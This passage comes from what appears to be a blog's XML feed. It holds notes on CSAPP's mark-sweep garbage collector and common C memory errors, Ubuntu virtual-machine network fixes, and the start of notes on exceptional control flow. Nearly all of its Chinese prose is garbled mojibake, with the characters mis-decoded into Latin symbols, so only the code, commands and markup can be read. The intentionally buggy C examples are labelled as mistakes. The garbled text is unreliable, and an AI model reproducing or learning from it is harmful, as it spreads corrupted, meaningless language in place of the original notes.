blockAllocated(ptr b)</code>ï¼šå¦‚æœå— b æ˜¯å·²åˆ†é…çš„ï¼Œé‚£ä¹ˆå°±è¿”å› trueã€‚</li><li><code>void markBlock(ptr b)</code>ï¼šæ ‡è®°å— bã€‚</li><li><code>int length (b)</code>ï¼šè¿”å›å— b çš„ä»¥å­—ä¸ºå•ä½çš„é•¿åº¦ï¼ˆä¸åŒ…æ‹¬å¤´éƒ¨ï¼‰ã€‚</li><li><code>void unmarkBlock(ptr b)</code>ï¼šå°†å— b çš„çŠ¶æ€ç”±å·²æ ‡è®°çš„æ”¹ä¸ºæœªæ ‡è®°çš„ã€‚</li><li><code>ptr nextBlock(ptr b)</code>ï¼šè¿”å›å †ä¸­å— b çš„åç»§ã€‚</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-mark%E5%92%8Csweep%E7%9A%84%E4%BC%AA%E4%BB%A3%E7%A0%81.png"></p><h4 id="æ ‡è®°é˜¶æ®µ"><a href="#æ ‡è®°é˜¶æ®µ" class="headerlink" title="æ ‡è®°é˜¶æ®µ"></a>æ ‡è®°é˜¶æ®µ</h4><p>æ ‡è®°é˜¶æ®µä¸º<strong>æ¯ä¸ªæ ¹èŠ‚ç‚¹è°ƒç”¨ä¸€æ¬¡ mark å‡½æ•°</strong>ã€‚å¦‚æœ p ä¸æŒ‡å‘ä¸€ä¸ªå·²åˆ†é…å¹¶ä¸”æœªæ ‡è®°çš„å †å—ï¼Œmark å‡½æ•°å°±ç«‹å³è¿”å›ã€‚å¦åˆ™ï¼Œå®ƒå°±æ ‡è®°è¿™ä¸ªå—ï¼Œå¹¶å¯¹å—ä¸­çš„æ¯ä¸ªå­—é€’å½’åœ°è°ƒç”¨å®ƒè‡ªå·±ã€‚</p><p>æ¯æ¬¡å¯¹ mark å‡½æ•°çš„è°ƒç”¨éƒ½æ ‡è®°æŸä¸ªæ ¹èŠ‚ç‚¹çš„æ‰€æœ‰æœªæ ‡è®°å¹¶ä¸”å¯è¾¾çš„åç»§èŠ‚ç‚¹ã€‚åœ¨æ ‡è®°é˜¶æ®µçš„æœ«å°¾ï¼Œä»»ä½•æœªæ ‡è®°çš„å·²åˆ†é…å—éƒ½è¢«è®¤å®šä¸ºæ˜¯ä¸å¯è¾¾çš„ï¼Œæ˜¯åƒåœ¾ï¼Œå¯ä»¥åœ¨æ¸…é™¤é˜¶æ®µå›æ”¶ã€‚</p><h4 id="æ¸…é™¤é˜¶æ®µ"><a href="#æ¸…é™¤é˜¶æ®µ" class="headerlink" title="æ¸…é™¤é˜¶æ®µ"></a>æ¸…é™¤é˜¶æ®µ</h4><p>æ¸…é™¤é˜¶æ®µæ˜¯<strong>å¯¹ sweep å‡½æ•°çš„ä¸€æ¬¡è°ƒç”¨</strong>ã€‚sweep å‡½æ•°åœ¨å †ä¸­<strong>æ¯ä¸ªå—ä¸Šåå¤å¾ªç¯</strong>ï¼Œé‡Šæ”¾å®ƒæ‰€é‡åˆ°çš„æ‰€æœ‰æœªæ ‡è®°çš„å·²åˆ†é…å—ï¼ˆä¹Ÿå°±æ˜¯åƒåœ¾ï¼‰ã€‚</p><h1 id="C-ç¨‹åºå¸¸è§çš„ä¸å†…å­˜æœ‰å…³çš„é”™è¯¯"><a href="#C-ç¨‹åºå¸¸è§çš„ä¸å†…å­˜æœ‰å…³çš„é”™è¯¯" class="headerlink" title="C ç¨‹åºå¸¸è§çš„ä¸å†…å­˜æœ‰å…³çš„é”™è¯¯"></a>C ç¨‹åºå¸¸è§çš„ä¸å†…å­˜æœ‰å…³çš„é”™è¯¯</h1><h3 id="é—´æ¥å¼•ç”¨åæŒ‡é’ˆ"><a href="#é—´æ¥å¼•ç”¨åæŒ‡é’ˆ" class="headerlink" title="é—´æ¥å¼•ç”¨åæŒ‡é’ˆ"></a>é—´æ¥å¼•ç”¨åæŒ‡é’ˆ</h3><p>åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­æœ‰å¾ˆå¤§çš„åŒºåŸŸå¹¶æ²¡æœ‰æ˜ å°„åˆ°ä»»ä½•æœ‰æ„ä¹‰çš„æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬è¯•å›¾é—´æ¥å¼•ç”¨ä¸€ä¸ªæŒ‡å‘è¿™äº›åŒºåŸŸçš„æŒ‡é’ˆï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿå°±ä¼šä»¥æ®µå¼‚å¸¸ä¸­æ­¢ç¨‹åºã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè™šæ‹Ÿå†…å­˜çš„æŸäº›åŒºåŸŸæ˜¯åªè¯»çš„ï¼Œè¯•å›¾å†™è¿™äº›åŒºåŸŸå°†ä¼šä»¥ä¿æŠ¤å¼‚å¸¸ä¸­æ­¢è¿™ä¸ªç¨‹åºã€‚</p><p>éå¸¸å¸¸è§çš„é”™è¯¯å°±æ˜¯ scanf é”™è¯¯ã€‚</p><p>å‡è®¾æˆ‘ä»¬æƒ³è¦ä½¿ç”¨ scanf ä» stdin è¯»ä¸€ä¸ªæ•´æ•°åˆ°ä¸€ä¸ªå˜é‡ã€‚æ­£ç¡®çš„æ–¹æ³•æ˜¯ä¼ é€’ç»™ scanf ä¸€ä¸ªæ ¼å¼ä¸²å’Œå˜é‡çš„åœ°å€ï¼š<code>scanf(&quot;%d&quot;ï¼Œ&amp;val)</code> ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ç»å¸¸ä¼šå¿˜è®°å–åœ°å€ç¬¦å·å†™æˆï¼š<code>scanf(&quot;%d&quot;ï¼Œval)</code> ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œscanf å°†æŠŠ val çš„å†…å®¹è§£é‡Šä¸ºä¸€ä¸ªåœ°å€ï¼Œå¹¶è¯•å›¾å°†ä¸€ä¸ªå­—å†™åˆ°è¿™ä¸ªä½ç½®ã€‚</p><p>åœ¨æœ€å¥½çš„æƒ…å†µä¸‹ï¼Œç¨‹åºç«‹å³ä»¥å¼‚å¸¸ç»ˆæ­¢ã€‚åœ¨æœ€ç³Ÿç³•çš„æƒ…å†µä¸‹ï¼Œval çš„å†…å®¹å¯¹åº”äºè™šæ‹Ÿå†…å­˜çš„æŸä¸ªåˆæ³•çš„è¯»&#x2F;å†™åŒºåŸŸï¼Œäºæ˜¯æˆ‘ä»¬å°±è¦†ç›–äº†è¿™å—å†…å­˜ï¼Œå¦‚æœè¿™å—å†…å­˜å­˜å‚¨äº†é‡è¦çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆåæœå°†ä¸å ªè®¾æƒ³ã€‚</p><h3 id="è¯»æœªåˆå§‹åŒ–çš„åœ°å€"><a href="#è¯»æœªåˆå§‹åŒ–çš„åœ°å€" class="headerlink" title="è¯»æœªåˆå§‹åŒ–çš„åœ°å€"></a>è¯»æœªåˆå§‹åŒ–çš„åœ°å€</h3><p>è™½ç„¶ bss å†…å­˜ä½ç½®æ€»æ˜¯è¢«åŠ è½½å™¨åˆå§‹åŒ–ä¸ºé›¶ï¼Œä½†æ˜¯å¯¹äºå †å†…å­˜å´å¹¶ä¸æ˜¯è¿™æ ·çš„ã€‚å¹¶ä¸”ï¼Œmalloc ç”³è¯·è¿‡æ¥çš„å†…å­˜ä¸ä¸€å®šæ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬éœ€è¦ memset æ‰‹åŠ¨æ¸…ç©ºï¼Œæˆ–è€…æ˜¯æ‹¿åˆ°å†…å­˜å°±ç›´æ¥å†™è€Œä¸è¿›è¡Œä»»ä½•è¯»çš„æ“ä½œã€‚</p><h3 id="å…è®¸ç¼“å†²åŒºæº¢å‡º"><a href="#å…è®¸ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="å…è®¸ç¼“å†²åŒºæº¢å‡º"></a>å…è®¸ç¼“å†²åŒºæº¢å‡º</h3><p>å¾ˆå¸¸è§ï¼Œå°±åƒ<code>gets()</code></p><h3 id="å‡è®¾æŒ‡é’ˆå’Œå®ƒä»¬æŒ‡å‘çš„å¯¹è±¡å¤§å°ç›¸åŒ"><a href="#å‡è®¾æŒ‡é’ˆå’Œå®ƒä»¬æŒ‡å‘çš„å¯¹è±¡å¤§å°ç›¸åŒ" class="headerlink" title="å‡è®¾æŒ‡é’ˆå’Œå®ƒä»¬æŒ‡å‘çš„å¯¹è±¡å¤§å°ç›¸åŒ"></a>å‡è®¾æŒ‡é’ˆå’Œå®ƒä»¬æŒ‡å‘çš„å¯¹è±¡å¤§å°ç›¸åŒ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create an nxm array */</span><br><span class="hljs-type">int</span> **<span class="hljs-title function_">makeArray1</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> **A = (<span class="hljs-type">int</span> **)Malloc(n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        A[i] = (<span class="hljs-type">int</span> *)Malloc(m * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">return</span> A;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªç”± n ä¸ªæŒ‡é’ˆç»„æˆçš„æ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘ä¸€ä¸ªåŒ…å« m ä¸ª int çš„æ•°ç»„ã€‚ç¨‹åºå‘˜åœ¨ç¬¬ 5è¡Œå°†  <code>sizeof(int *)</code> å†™æˆäº† <code>sizeof(int)</code> ï¼Œä»£ç å®é™…ä¸Šåˆ›å»ºçš„æ˜¯ä¸€ä¸ª int çš„æ•°ç»„ã€‚è¿™ä¸ªç¨‹åºåªä¼šåœ¨ 32 ä½ç¯å¢ƒä¸‹è¿è¡Œè‰¯å¥½ï¼Œå¦‚æœåœ¨ 64 ä½çš„ç¯å¢ƒä¸‹ä¼šå‡ºç°ä¸å¯é¢„æµ‹çš„é”™è¯¯ã€‚</p><h3 id="é€ æˆé”™è¯¯è¡Œä½é”™è¯¯"><a href="#é€ æˆé”™è¯¯è¡Œä½é”™è¯¯" class="headerlink" title="é€ æˆé”™è¯¯è¡Œä½é”™è¯¯"></a>é€ æˆé”™è¯¯è¡Œä½é”™è¯¯</h3><p>é”™ä½ï¼ˆoff-by-oneï¼‰é”™è¯¯æ˜¯å¦ä¸€ç§å¾ˆå¸¸è§çš„é€ æˆè¦†ç›–é”™è¯¯çš„æ¥æºã€‚</p><p>æœ€å¸¸è§çš„å°±æ˜¯ <code>int a[n];for(int i=1;i&lt;=n;i++)</code> è¿™ç§ç±»å‹çš„ä»£ç ã€‚å¾ˆæ˜¾ç„¶ï¼Œ<code>int a[n]</code> çš„å®šä¹‰ä¸­ä¸åŒ…æ‹¬ä¸‹æ ‡ <code>n</code>ï¼Œä¼šè¦†ç›–ç›®æ ‡æ•°ç»„ä¹‹å¤–çš„å†…å­˜åŒºåŸŸï¼Œé€ æˆçš„é”™è¯¯ä¹Ÿæ˜¯ä¸å¯é¢„ä¼°çš„ã€‚</p><h3 id="å¼•ç”¨æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å®ƒæ‰€æŒ‡å‘çš„å¯¹è±¡"><a href="#å¼•ç”¨æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å®ƒæ‰€æŒ‡å‘çš„å¯¹è±¡" class="headerlink" title="å¼•ç”¨æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å®ƒæ‰€æŒ‡å‘çš„å¯¹è±¡"></a>å¼•ç”¨æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å®ƒæ‰€æŒ‡å‘çš„å¯¹è±¡</h3><p>æ¯”å¦‚å¸¸è§çš„ <code>*p++</code>ï¼Œè™½ç„¶è¯´ <code>++</code> å’Œå–å€¼è¿ç®—ç¬¦ä¼˜å…ˆçº§ä¸€æ ·ï¼Œä½†æ˜¯å®ƒæ˜¯ä»å³å¾€å·¦ç»“åˆçš„ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬å¹¶æ²¡æœ‰ç»™ p æ‰€æŒ‡å‘çš„å€¼ +1 è€Œæ˜¯è®©æŒ‡é’ˆåç§»äº†ä¸€ä½å†å–å€¼ã€‚</p><h3 id="è¯¯è§£æŒ‡é’ˆè¿ç®—"><a href="#è¯¯è§£æŒ‡é’ˆè¿ç®—" class="headerlink" title="è¯¯è§£æŒ‡é’ˆè¿ç®—"></a>è¯¯è§£æŒ‡é’ˆè¿ç®—</h3><p>è¿™ç§é”™è¯¯æ˜¯å¿˜è®°äº†æŒ‡é’ˆçš„ç®—æœ¯æ“ä½œæ˜¯ä»¥å®ƒä»¬æŒ‡å‘çš„å¯¹è±¡çš„å¤§å°ä¸ºå•ä½æ¥è¿›è¡Œçš„ï¼Œè€Œè¿™ç§å¤§å°å•ä½å¹¶ä¸ä¸€å®šæ˜¯å­—èŠ‚ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢å‡½æ•°çš„ç›®çš„æ˜¯æ‰«æä¸€ä¸ª int çš„æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡é’ˆã€‚ä½†æ¯æ¬¡å¾ªç¯ç¬¬å››è¡Œéƒ½ä¼šæŠŠæŒ‡é’ˆåŠ  4 ï¼Œå‡½æ•°å°±ä¼šä¸æ­£ç¡®çš„æ‰«ææ•°ç»„ä¸­çš„æ¯ 4 ä¸ªæ•´æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *<span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span> *p, <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (*p &amp;&amp; *p != val)<br>        p += <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>); <span class="hljs-comment">/* Should be p++ */</span><br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› ä¸ºæŒ‡é’ˆä¸ int è¿ç®—å·²ç»é‡è½½äº† <code>+ - += -=</code> ç­‰è¿ç®—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡å¿…è¦å¤šæ­¤ä¸€ä¸¾ä¹˜ä¸Šä¸€ä¸ª sizeofã€‚</p><h3 id="å¼•ç”¨ä¸å­˜åœ¨çš„å˜é‡"><a href="#å¼•ç”¨ä¸å­˜åœ¨çš„å˜é‡" class="headerlink" title="å¼•ç”¨ä¸å­˜åœ¨çš„å˜é‡"></a>å¼•ç”¨ä¸å­˜åœ¨çš„å˜é‡</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *<span class="hljs-title function_">stackref</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    <br>    <span class="hljs-keyword">return</span> &amp;val;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘æ ˆé‡Œçš„ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œç„¶åå¼¹å‡ºå®ƒçš„æ ˆå¸§ã€‚å°½ç®¡ p ä»ç„¶æŒ‡å‘ä¸€ä¸ªåˆæ³•çš„å†…å­˜åœ°å€ï¼Œä½†æ˜¯å®ƒå·²ç»ä¸å†æŒ‡å‘ä¸€ä¸ªåˆæ³•çš„å˜é‡äº†ã€‚å½“ä»¥ååœ¨ç¨‹åºä¸­è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶ï¼Œå†…å­˜å°†é‡ç”¨å®ƒä»¬çš„æ ˆå¸§ã€‚</p><h3 id="å¼•ç”¨ç©ºé—²å †å—ä¸­çš„æ•°æ®"><a href="#å¼•ç”¨ç©ºé—²å †å—ä¸­çš„æ•°æ®" class="headerlink" title="å¼•ç”¨ç©ºé—²å †å—ä¸­çš„æ•°æ®"></a>å¼•ç”¨ç©ºé—²å †å—ä¸­çš„æ•°æ®</h3><p>å°±æ˜¯ UAF å•¦</p><h3 id="å¼•èµ·å†…å­˜æ³„æ¼"><a href="#å¼•èµ·å†…å­˜æ³„æ¼" class="headerlink" title="å¼•èµ·å†…å­˜æ³„æ¼"></a>å¼•èµ·å†…å­˜æ³„æ¼</h3><p>å†…å­˜æ³„æ¼ç†è§£ä¸ºå†…å­˜èµ„æºæ³„éœ²ï¼Œå°±æ˜¯æ²¡æœ‰é‡Šæ”¾ä¸ä½¿ç”¨çš„ç©ºé—´ï¼Œå¯¼è‡´ç¨‹åºæ‰€å ç”¨çš„ç©ºé—´éå¸¸å¤§ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†ç©ºé—´åˆä¸ä½¿ç”¨ï¼Œé‚£è¿™ä¸€éƒ¨åˆ†çš„ç©ºé—´å°±ä¼šè¢«æµªè´¹äº†ã€‚</p><hr><p>åœ¨å‡ å¤©åœ¨å¿™ç¤¾å›¢å¹´å®¡å’Œæ—¥å¸¸æ»¡è¯¾ğŸ« </p><p>æƒ³é¼ äº†</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/%E4%B8%80%E4%B8%AAModifier%E5%8E%9F%E5%88%99.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
      <tag>è™šæ‹Ÿå†…å­˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntuå„ç§ç½‘ç»œé—®é¢˜</title>
    <link href="/2023/12/02/ubuntu%E5%90%84%E7%A7%8D%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/"/>
    <url>/2023/12/02/ubuntu%E5%90%84%E7%A7%8D%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>è¯·æ ¡å›­ç½‘æ»šå‡ºæ ¡å›­ï¼</p><span id="more"></span><h1 id="æ²¡æœ‰ç½‘ç»œå›¾æ ‡"><a href="#æ²¡æœ‰ç½‘ç»œå›¾æ ‡" class="headerlink" title="æ²¡æœ‰ç½‘ç»œå›¾æ ‡"></a>æ²¡æœ‰ç½‘ç»œå›¾æ ‡</h1><p>æ²¡æœ‰ç½‘ç»œå›¾æ ‡ä¹Ÿè¿ä¸ä¸Šç½‘è¾£ï¼ğŸ¤”</p><p>å…³é—­ç½‘ç»œæœåŠ¡å†åˆ é™¤æ–‡ä»¶ï¼Œæœ€åé‡æ–°å¯åŠ¨æœåŠ¡ã€‚åœ¨terminalä¸­è¾“å…¥ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤å³å¯æ¢å¤</p><p>é‡å¯å¯ä»¥è§£å†³ç™¾åˆ†ä¹‹ä¹åä¹çš„é—®é¢˜ğŸ¤¤</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo service NetworkManager stop <br> <br>sudo rm /var/lib/NetworkManager/NetworkManager.<span class="hljs-keyword">state</span> <br> <br>sudo service NetworkManager start<br></code></pre></td></tr></table></figure><blockquote><p>NetworkManager æ˜¯ 22ç‰ˆæœ¬ å¯¹åº”çš„åç§°ï¼Œä¸åŒç‰ˆæœ¬çš„ä¸ä¸€æ ·ä½†æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œè¯·è‡ªè¡Œç™¾åº¦</p></blockquote><h1 id="Connection-failed"><a href="#Connection-failed" class="headerlink" title="Connection failed"></a>Connection failed</h1><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-28_19-41-49.png"></p><p>é‡å¯ç½‘ç»œä¸è¡Œï¼Œå°±æ˜¯ä¸€ç›´è¿æ¥å¤±è´¥</p><p>è§£å†³æ–¹æ³•ï¼šé‡å¯ä¸»æœº</p><p>æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥å°±æ˜¯é‡å¯ä¸»æœºå°±å¥½äº†</p><p>å¦‚æœä¸å¥½ï¼Œå°±é‡ç½®ç½‘ç»œè®¾ç½®</p><p>ç¼–è¾‘-&gt;è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨-&gt;æ›´æ”¹è®¾ç½®-&gt;è¿˜åŸé»˜è®¤è®¾ç½®</p><h1 id="ç½‘ç»œå›¾æ ‡æ˜¾ç¤ºé—®å·"><a href="#ç½‘ç»œå›¾æ ‡æ˜¾ç¤ºé—®å·" class="headerlink" title="ç½‘ç»œå›¾æ ‡æ˜¾ç¤ºé—®å·"></a>ç½‘ç»œå›¾æ ‡æ˜¾ç¤ºé—®å·</h1><blockquote><p>äº‹æƒ…å‘ç”Ÿåœ¨æˆ‘è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨é‡Œæ¢å¤é»˜è®¤è®¾ç½®ä¹‹å</p></blockquote><p>ç½‘ä¸Šæœ‰äººè¯´æ˜¯ï¼šè®¾ç½®-&gt;éšç§-&gt;æ­£åœ¨æ£€æŸ¥è¿æ¥-&gt;å…³</p><p>ç¡®å®ä¼šæ²¡æœ‰é—®å·ï¼Œä½†æ˜¯è¿˜æ˜¯è¿ä¸ä¸Šç½‘ã€‚</p><p>restartä»¥åå°±è¿™æ ·äº†ğŸ˜…</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-22-35.png"></p><p>æ˜¯å› ä¸ºæˆ‘é‡æ–°è®¾ç½®åçš„ NAT çš„ç½‘å¡å’Œä¸»æœºç½‘å¡ä¸ä¸€æ ·</p><p>ipconfig åœ¨ä¸»æœºé‡Œé¢æŸ¥çœ‹æˆ‘è‡ªå·±çš„ç½‘å¡æ˜¯192.168.5.1ï¼Œè™šæ‹Ÿç½‘ç»œè®¾ç½®é‡Œæ˜¯ 192.168.5.2</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-55-35.png"></p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-55-51.png"></p><p>æ”¹äº†å°±è¡Œï¼Œé‡å¯ä¸€ä¸‹è™šæ‹Ÿæœº</p><p>è¿˜æ˜¯ä¸è¡Œ</p><h1 id="ping-8-8-8-8-é€šä½†ä¸èƒ½ä¸Šç½‘"><a href="#ping-8-8-8-8-é€šä½†ä¸èƒ½ä¸Šç½‘" class="headerlink" title="ping 8.8.8.8 é€šä½†ä¸èƒ½ä¸Šç½‘"></a>ping 8.8.8.8 é€šä½†ä¸èƒ½ä¸Šç½‘</h1><p>å¦‚æœ ping 8.8.8.8 å°±æ˜¯è·¯ç”±æ²¡è®¾ç½®å¥½</p><p>é€šä½†ä¸èƒ½ä¸Šç½‘å°±æ˜¯ DNS æ²¡è®¾ç½®å¥½</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo gedit /etc/resolv.conf <br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºï¼šnameserver 8.8.8.8</p><p>å°±å¥½å•¦</p><blockquote><p>è¿™ç§æƒ…å†µä¸‹ï¼Œè¿˜ä¼šå‡ºç° Could not resolve hostname:xxx è¿™ç§æƒ…å†µ</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬å…«ç«  å¼‚å¸¸æ§åˆ¶æµ</title>
    <link href="/2023/11/30/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/"/>
    <url>/2023/11/30/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<p>ç³»ç»Ÿçš„å¼‚å¸¸å¤„ç†æœºåˆ¶</p><span id="more"></span><p>ä»ç»™å¤„ç†å™¨åŠ ç”µå¼€å§‹ï¼Œåˆ°æ–­ç”µä½ç½®ï¼Œç¨‹åºè®¡æ•°å™¨å‡è®¾ä¸€ä¸ªå€¼çš„åºåˆ— $$a_0,a_1,a_2,Â·Â·Â·,a_{n-1}$$ï¼Œå…¶ä¸­ $$a_i$$ æ˜¯æŸä¸ªæŒ‡ä»¤ $$I_k$$ çš„åœ°å€ï¼Œæ¯æ¬¡ä»  $$a_i$$ åˆ° $$a_{i+1}$$ çš„è¿‡æ¸¡å«åš<strong>æ§åˆ¶è½¬ç§»</strong>ã€‚è¿™æ ·çš„æ§åˆ¶è½¬ç§»åºåˆ—å«åšå¤„ç†å™¨çš„<strong>æ§åˆ¶æµ</strong>ã€‚</p><p><strong>çªå˜</strong>æ˜¯æŒ‡åœ¨å¹³æ»‘æµï¼ˆç›¸é‚»æŒ‡ä»¤çš„åœ°å€ä¹Ÿæ˜¯ç›¸é‚»çš„ï¼‰ä¸­ï¼Œè°ƒç”¨è¯¸å¦‚è·³è½¬ã€è°ƒç”¨å’Œè¿”å›è¿™æ ·çš„ç¨‹åºæŒ‡ä»¤é€ æˆçš„ç›¸é‚»æŒ‡ä»¤åœ°å€ä¸ç›¸é‚»çš„æƒ…å†µã€‚</p><p>åŒæ—¶ç³»ç»Ÿå¿…é¡»è¦å¯¹ç³»ç»ŸçŠ¶æ€çš„å˜åŒ–åšå‡ºååº”ï¼Œæ¯”å›¾ç¡¬ä»¶å®šæ—¶å™¨å®šæ—¶äº§ç”Ÿä¿¡å·ï¼Œè€Œè¿™ä¸ªç³»ç»ŸçŠ¶æ€å¹¶ä¸æ˜¯è¢«å†…éƒ¨çš„ç¨‹åºå˜é‡æ•è·çš„ï¼Œä¹Ÿä¸å’Œç¨‹åºæ‰§è¡Œç›¸å…³ã€‚æƒ³å¸¦ç³»ç»Ÿé€šè¿‡ä½¿æ§åˆ¶æµå‘ç”Ÿæ¥å¯¹è¿™ç§æƒ…å†µåšå‡ºååº”ï¼Œæˆ‘ä»¬æŠŠè¿™äº›çªå˜ç§°ä¸º<strong>å¼‚å¸¸æ§åˆ¶æµï¼ˆExceptional Control Flowï¼ŒECFï¼‰</strong>ã€‚</p><h1 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h1><p>å¼‚å¸¸å°±æ˜¯æ§åˆ¶æµä¸­çš„çªå˜ï¼Œç”¨æ¥ç›¸åº”å¤„ç†å™¨çŠ¶æ€ä¸­çš„æŸäº›å˜åŒ–ã€‚çŠ¶æ€å˜åŒ–ç§°ä¸º<strong>äº‹ä»¶</strong>ï¼Œäº‹ä»¶å¯èƒ½ä¸å½“å‰æŒ‡ä»¤ç›´æ¥ç›¸å…³ã€‚åœ¨å¤„ç†å™¨ä¸­ï¼ŒçŠ¶æ€è¢«ç¼–ç ä¸ºä¸åŒçš„ä½å’Œä¿¡å·ã€‚</p><p>å¦‚ä¸‹å›¾å±•ç¤ºäº†å¼‚å¸¸å¤„ç†çš„åŸºæœ¬æ€æƒ³ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E6%B5%81%E7%A8%8B.png"></p><p>å½“å¤„ç†å™¨çŠ¶æ€å‘ç”Ÿä¸€ä¸ªé‡è¦çš„å˜åŒ–æ—¶ï¼Œå¤„ç†å™¨æ­£åœ¨æ‰§è¡ŒæŸä¸ªå½“å‰æŒ‡ä»¤ $$I_{curr}$$ ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œå½“å¤„ç†å™¨æ£€æµ‹åˆ°æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå®ƒå°±ä¼šé€šè¿‡ä¸€å¼ å«åš<strong>å¼‚å¸¸è¡¨</strong>ï¼ˆexception 